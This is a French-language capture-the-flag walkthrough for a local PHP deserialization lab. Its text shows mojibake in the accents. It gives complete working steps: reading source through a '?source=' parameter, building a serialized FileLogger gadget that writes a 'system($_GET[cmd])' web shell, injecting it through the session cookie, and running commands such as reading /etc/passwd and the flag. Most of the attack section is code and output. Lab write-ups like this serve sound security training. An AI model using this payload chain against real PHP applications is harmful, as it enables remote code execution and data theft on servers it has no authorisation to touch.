# CTF-5: Exploitation Compl√®te (Sans acc√®s Docker)

## üéØ R√©sum√© du CTF

Ce laboratoire teste les vuln√©rabilit√©s de d√©s√©rialisation PHP. L'objectif est d'obtenir une RCE (Remote Code Execution) en exploitant une injection d'objets.

## üìç √âtapes d'exploitation

### √âtape 1 : Reconnaissance basique

```bash
curl -i http://localhost:8005/
```

**Observations** :
- Page de gestion de sessions
- Cookie `session_data` visible dans le navigateur
- Pas de m√©thode √©vidente pour devenir admin

---

### √âtape 2 : D√©couverte de l'indice (Piste intentionnelle)

**En consultant le code source HTML** ou **apr√®s 3 secondes d'attente**, une message appara√Æt :

```
üí° Hint: Syst√®mes de d√©bogage actifs. Essayez ?source=classes ou ?source=index pour inspecter le code.
```

Ou regarder les commentaires HTML :
```bash
curl -s http://localhost:8005/ | grep DEBUG
```

---

### √âtape 3 : Extraire le code source via LFI

```bash
# Extraire classes.php
curl -s 'http://localhost:8005/index.php?source=classes'

# Extraire index.php
curl -s 'http://localhost:8005/index.php?source=index'
```

**R√©sultat obtenu** :
- Classes `UserSession` et `FileLogger`
- M√©thode `__destruct()` dans `FileLogger`
- Utilisation de `unserialize()` sur le cookie

---

### √âtape 4 : Identifier la vuln√©rabilit√©

**Analyse critique** :

1. **Source du probl√®me** : `index.php`
   ```php
   $decoded_data = base64_decode($_COOKIE['session_data'], true);
   $session = unserialize($decoded_data);  // ‚ö†Ô∏è Vuln√©rable !
   ```

2. **Gadget chain** : `FileLogger::__destruct()`
   ```php
   public function __destruct()
   {
       file_put_contents($this->logFile, $this->message . "\n", FILE_APPEND);
   }
   ```

3. **Exploitation** :
   - Cr√©er un objet `FileLogger` malveillant
   - S√©rialiser avec les propri√©t√©s publiques
   - Encoder en Base64
   - Injecter via le cookie

---

### √âtape 5 : Cr√©er le payload

**G√©n√©rer un objet FileLogger s√©rialis√©** :

Depuis un autre container ou syst√®me avec PHP :
```bash
docker exec ctf5-php-injection php -r '
class FileLogger {
    public $logFile;
    public $message;
    public function __construct($f, $m) {
        $this->logFile = $f;
        $this->message = $m;
    }
}
$obj = new FileLogger("/var/www/html/shell.php", "<?php system(\$_GET[\"cmd\"]); ?>");
echo base64_encode(serialize($obj));
'
```

**R√©sultat** :
```
TzoxMDoiRmlsZUxvZ2dlciI6Mjp7czo3OiJsb2dGaWxlIjtzOjIzOiIvdmFyL3d3dy9odG1sL3NoZWxsLnBocCI7czo3OiJtZXNzYWdlIjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4iO30=
```

---

### √âtape 6 : Injecter le payload

```bash
PAYLOAD="TzoxMDoiRmlsZUxvZ2dlciI6Mjp7czo3OiJsb2dGaWxlIjtzOjIzOiIvdmFyL3d3dy9odG1sL3NoZWxsLnBocCI7czo3OiJtZXNzYWdlIjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4iO30="

curl -i 'http://localhost:8005/index.php' \
  -H "Cookie: session_data=$PAYLOAD"
```

**√Ä cet instant** :
- La requ√™te s'ex√©cute normalement (HTTP 200)
- √Ä la fin du script PHP, `__destruct()` cr√©e `/var/www/html/shell.php`

---

### √âtape 7 : Exploiter la RCE

```bash
# Tester l'acc√®s
curl 'http://localhost:8005/shell.php?cmd=id'
```

**R√©sultat** :
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Commandes possibles** :
```bash
# √ânum√©rer les fichiers
curl 'http://localhost:8005/shell.php?cmd=ls%20-la%20/var/www/html/'

# Lire des fichiers
curl 'http://localhost:8005/shell.php?cmd=cat%20/etc/passwd'

# Ex√©cuter des commandes complexes
curl 'http://localhost:8005/shell.php?cmd=find%20/%20-name%20flag.txt%202>/dev/null'
```

---

### √âtape 8 : Obtenir le flag

**R√©cup√©ration directe** :
```bash
curl 'http://localhost:8005/shell.php?cmd=cat%20/flag.txt'
```

**R√©sultat** :
```
FLAG{PHP_Object_Injection_Lab_2025}
```

**Autres m√©thodes** :
```bash
# Avec xxd pour voir l'hexad√©cimal
curl 'http://localhost:8005/shell.php?cmd=xxd%20/flag.txt'

# Avec file pour v√©rifier le type
curl 'http://localhost:8005/shell.php?cmd=file%20/flag.txt'

# Avec wc pour compter les caract√®res
curl 'http://localhost:8005/shell.php?cmd=wc%20/flag.txt'
```

---

## üîë Points cl√©s de l'exploitation

| Point | D√©tail |
|-------|--------|
| **Vuln√©rabilit√© initiale** | LFI via `?source=` pour lire le code |
| **Vuln√©rabilit√© principale** | `unserialize()` sur donn√©es non fiables |
| **Gadget chain** | `FileLogger::__destruct()` ‚Üí `file_put_contents()` |
| **Impact** | RCE via cr√©ation de web shell |
| **Mitigation** | Utiliser `json_decode()` au lieu de `unserialize()` |

---

## üìã Commandes rapides

```bash
# 1. D√©couvrir la piste
curl -s http://localhost:8005/ | grep -i hint

# 2. Extraire le code
curl -s 'http://localhost:8005/index.php?source=classes'

# 3. G√©n√©rer le payload
PAYLOAD=$(docker exec ctf5-php-injection php -r 'class FileLogger {public $logFile; public $message; public function __construct($f, $m) {$this->logFile = $f; $this->message = $m;}} $obj = new FileLogger("/var/www/html/shell.php", "<?php system(\$_GET[\"cmd\"]); ?>"); echo base64_encode(serialize($obj));')

# 4. Injecter le payload
curl -H "Cookie: session_data=$PAYLOAD" 'http://localhost:8005/index.php'

# 5. Exploiter la RCE
curl 'http://localhost:8005/shell.php?cmd=id'
```

---

## ‚úÖ Validation

- [x] Code source d√©couvert via LFI
- [x] Vuln√©rabilit√© de d√©s√©rialisation identifi√©e
- [x] Gadget chain `FileLogger` exploit√©
- [x] Web shell cr√©√©e
- [x] RCE confirm√©e (`uid=33(www-data)`)
- [x] Flag obtenu

